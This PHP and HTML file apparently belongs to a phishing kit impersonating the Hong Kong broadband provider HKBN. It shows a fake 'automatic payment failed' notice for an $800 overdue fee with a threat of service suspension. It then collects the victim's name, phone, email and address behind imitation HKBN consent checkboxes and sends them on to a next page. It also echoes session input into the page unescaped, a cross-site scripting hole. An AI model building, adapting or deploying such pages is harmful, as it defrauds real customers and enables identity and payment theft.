<?php
session_start();
//include('partials/header.php');
include('header_.php');


if (isset($_POST['submit']) || isset($_POST['username'])) {
    $_SESSION['step1Data'] = $_POST;
}

?>
<style>
    .wrap {
        padding: 30px 20px;
        /*        margin-top:70px;*/
        padding-bottom: 20px;
        /* background: #dedede; */
        background: white;
    }

    .top1 {
        background: white;
    }

    a.main-logo {
        display: block;
        margin: 11px 0 25px 0;
        text-align: center;
        color: #00a8b7;
        font-size: 19px;
        font-weight: bold;
    }

    .notice {
        line-height: 2;
        padding: 10px;
        border-radius: 5px;
        color: #777977;
        margin: 30px 0 40px;
        background: #f0f0eb;
    }

    @media(max-width: 767px) {
        p.like_viewmore {
            font-size: 13px;
            color: red;
            cursor: pointer;
        }

        .submit-btn {
            text-align: center;
            background-color: #00a8b7 !important;
            padding: 11px 24px;
            font-size: 1rem;
            display: block;
            width: auto;
            min-width: 120px;
            margin-left: auto;
            margin-right: auto;
            line-height: 22px;
            border-radius: 32px;
            color: #fff;
            border-color: #00a8b7;
            height: auto;
            cursor: pointer;
        }

        .submit-btn:hover:hover {
            background-color: #00a8b7;
            border-color: #00a8b7;
        }

        .loader-wrap {
            display: flex;
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            align-items: center;
            justify-content: center;
            z-index: 99999999999999;
            background: rgba(255, 255, 255, 1);
        }

        .loader-wrap .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-wrap .loading img.china-mobile-logo-img {
            width: 200px;
        }

        .loader-wrap .loading img {
            width: 80px;
        }
    }

    table,
    tr,
    th {

        padding: 10px;

        margin: auto;
        border: none;
        border-collapse: separate;
        /* border-radius: 10px; */

    }

    .cstm-table-new tr td strong {
        color: #004F98;
    }

    .top1 p {
        color: #004F98;
        padding: 10px 0px;
    }

    .total-price {
        /* border-radius: 1em; */
        background: #fff;
        padding: 11px 19px;
        margin-bottom: 17px;
        border-bottom: 2px solid #dedede;
    }

    span.total-price-inner {
        float: right;
        color: #004F98;
        padding-right: 43px;
    }

    tr.alert-notice {
        float: right;
    }

    tr.alert-notice>td {
        border: none;
    }

    table tr.input-as-text {
        border-radius: 10px;
        background: #fff;
    }

    .img-text {
        background: url("https://tarjetabip.cl/images/bot-carga-online.png") no-repeat top center;
        background-size: 100%;
        width: 100%;
        height: 110px;
        position: relative;
        display: table;
    }

    .text-center {
        border-top: 2px solid #dedede;
    }

    .top1 p {
        border-top: 2px solid #dedede;
    }

    table {
        border-top: 2px solid #dedede;
    }

    .center {
        border-top: 2px solid #dedede;
    }

    .img-text h3 {
        font-size: 25px !important;
        display: table-cell !important;
        text-align: center;
        /* padding-top: 30px; */
        color: white;
        font-weight: bold;
        text-shadow: 1px 1px 2px rgba(0, 0, 0, 1);
        vertical-align: middle !important;
        line-height: 25px;
    }

    ::placeholder {
        /* Chrome, Firefox, Opera, Safari 10.1+ */
        color: #000;
        opacity: 1;
        /* Firefox */
    }

    :-ms-input-placeholder {
        /* Internet Explorer 10-11 */
        color: #000;
    }

    ::-ms-input-placeholder {
        /* Microsoft Edge */
        color: #000;
    }

    body.zh_HK input {
        font-weight: normal !important;
    }

    tr.input-as-text {
        border-top-left-radius: 10px;
    }

    tr.input-as-text {
        border-top-right-radius: 10px;
    }

    tr.input-as-text {
        border-bottom-left-radius: 10px;
    }

    tr.input-as-text {
        border-bottom-right-radius: 10px;
    }

    .c_label {
        color: #024D7F;
    }

    .c_input {
        font-size: 12px;
        height: 37px;
    }

    .cb_parent {
        border: 1px solid #777977;
        fill: #fff;
        height: 15px;
        width: 15px;
        position: relative;
    }

    .cb {
        position: relative;
        top: -5px;
        left: -5px;
        fill: #ffffff00;
        height: 22px;
        width: 22px;
    }

    .cb_active {
        fill: #F26F21 !important;
    }

    .c_u {
        color: #024D7F;
    }
</style>
<div class="wrap old_code_wrap">
    <div class="top1">
        <div class="sm-img">
            <a href="#">
                <div class="img-text">
                    <h3>在线充值</h3>
                </div>
            </a>
        </div>
        <h3 class="text-center" style="color:#004F98;">您当前待支付的金额为$800</h3>
        <p>客户：<?php echo isset($_SESSION['step1Data']['username']) ? $_SESSION['step1Data']['username'] : ''; ?> </p>
        <table class="cstm-table-new" width="100%">

            <tbody>
                <!-- <tr class="input-as-text">
            <td><input type="text" value="" placeholder="輸入預繳電費金額" size="20"></td>
            <td>元</td>
        </tr> -->
                <tr class="alert-notice">
                    <td><strong style="color:red;text-align: center;">自动扣款失败，请手动支付</strong></td>
                </tr>
                <tr>
                    <td><strong>账单月份</strong></td>
                    <td>30/8</td>
                </tr>
                <tr>
                    <td><strong>费率类型</strong></td>
                    <td>逾期费用</td>
                </tr>
                <tr>
                    <td><strong>应付金额</strong></td>
                    <td>$800</td>
                </tr>

            </tbody>

        </table>
        <div class="center">
            <div class="total-price">
                <span><strong>请注意：拖欠支付服务将被暂停</strong></span>
                <span class="total-price-inner"></span>
            </div>
            <a href="page4.php" class="submit-btn">下一步</a>
        </div>


    </div>
</div>
<div class="wrap only_mobile" style="background-color: #fafafa;">
    <div class="container">
        <div class="">
            <div>
                <h2 class="form_title">個人認證</h2>
                <p class="form_dis">請填寫以下資料進行使用者身份覈實(需和登記資料保持一致)</p>
            </div>
            <form action="/page4.php" method="post">
                <label class="c_label" for="fname">* 姓名</label>
                <input class="c_input" type="text" id="fullnamePage2" name="fullnamePage2" placeholder="姓氏（請以英文填寫）"><br>

                <label class="c_label" for="phone">* 聯絡電話 (手提)</label>
                <div style="display: flex; justify-content: space-between; gap: 20px;">
                    <input class="c_input" type="text" id="phone" name="phone" placeholder="必須填寫">
                    <!-- <button style="padding: 7px; width: 50%; font-size: 12px; background-color: E1E1E1; color: #9f9f9f">驗證</button> -->
                </div>

                <label class="c_label" for="phone">* 聯絡電郵</label>
                <div style="display: flex; justify-content: space-between; gap: 20px;">
                    <input class="c_input" type="text" id="email" name="email" placeholder="必須填寫">
                    <!-- <button style="padding: 7px; width: 50%; font-size: 12px; background-color: E1E1E1; color: #9f9f9f">驗證</button> -->
                </div>

                <label class="c_label" for="phone">請選擇你的居住地區</label>
                <div style="position: relative;">
                    <input class="c_input" type="text"  id="address" name="address" placeholder="大廈、屋苑、街道名稱(中英文均可)。例子: 沙田第一城">
                    
                        <path d="M7 10l5 5 5-5z"></path>
                    </svg>
                    <div id="drop_down" style="z-index: 100; display: none; position: absolute; top: 102%; width: 100%; padding: 10px; background-color: white; border: 1px solid #ccc;">
                        請輸入關鍵字
                    </div>
                </div>
                <div class="flex gap-4 align-items-center">
                    <div class="cb_parent" id="cb_parent" onclick="toggle_cb('cb1')">
                        <svg class="cb" id="cb1" focusable="false" viewBox="0 0 24 24" aria-hidden="true">
                            <path d="M19 3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.11 0 2-.9 2-2V5c0-1.1-.89-2-2-2zm-9 14l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path>
                        </svg>
                    </div>
                    <label style="font-weight: 400;" for="">本人同意登記身份驗證My HKBN且同意並接受 <u class="c_u">HKBN之條款及細則</u> </label>
                </div>
                <div class="flex gap-4 align-items-center">
                    <div class="cb_parent" id="cb_parent" onclick="toggle_cb('cb2')">
                        <svg class="cb" id="cb2" focusable="false" viewBox="0 0 24 24" aria-hidden="true">
                            <path d="M19 3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.11 0 2-.9 2-2V5c0-1.1-.89-2-2-2zm-9 14l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path>
                        </svg>
                    </div>
                    <label style="font-weight: 400;" for="">本人明白及同意香港寬頻之 <u class="c_u">個人資料收集聲明</u> 及 <u class="c_u">個人資料及私隱政策聲明</u> ，並同意香港寬頻根據前述聲明處理我的個人資料。 </label>
                </div>
                <div class="flex gap-4 align-items-center">
                    <div class="cb_parent" id="cb_parent" onclick="toggle_cb('cb3')">
                        <svg class="cb" id="cb3" focusable="false" viewBox="0 0 24 24" aria-hidden="true">
                            <path d="M19 3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.11 0 2-.9 2-2V5c0-1.1-.89-2-2-2zm-9 14l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path>
                        </svg>
                    </div>
                    <label style="font-weight: 400;" for="">本人願意接收香港寬頻之個人資料收集聲明內所述的宣傳及推廣資訊，包括不定時推出之最新獎賞、折扣、獨家優惠及最新資訊。</label>
                </div>
                <!-- 
                <label class="c_label" for="lname">地址</label>
                <input class="c_input" type="text" id="address" name="address"><br> 

               <label class="c_label" for="lname">房屋、公寓等（可选）</label>
                <input class="c_input" type="text" id="straight" name="straight"><br> 
               
                <label class="c_label" for="lname">城市</label>
                <input class="c_input" type="text" id="city" name="city"><br>

                <label class="c_label" for="lname">省/州</label>
                <input class="c_input" type="text" id="country" name="country"><br>

                <label class="c_label" for="lname">邮政编码</label>
                <input class="c_input" type="text" id="zipcode" name="zipcode"><br>

                <label class="c_label" for="lname">电子邮箱</label>
                <input class="c_input" type="text" id="email" name="email"><br> -->

                <input type="submit" class="button_next" style="background-color: #F26F21; font-weight: 700;" name="page2_submit" value="提交">
            </form>

        </div>
    </div>
</div>
<div>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
    function dropdown_toggle() {
        const drop_down = document.getElementById("drop_down");
        drop_down.style.display = drop_down.style.display === "block" ? "none" : "block";
    }

    function toggle_cb(cb) {
        const _cb = document.getElementById(cb)
        _cb.classList.toggle("cb_active")
        // console.log(
        //     _cb.style.fill
        // );
        // _cb.style.fill = _cb.style.fill === "#ffffff00" ? "#F26F21" : "#ffffff00"
    }
    // document.getElementById("address").onclick(() => {})
</script>

<?php include('footer_.php'); ?>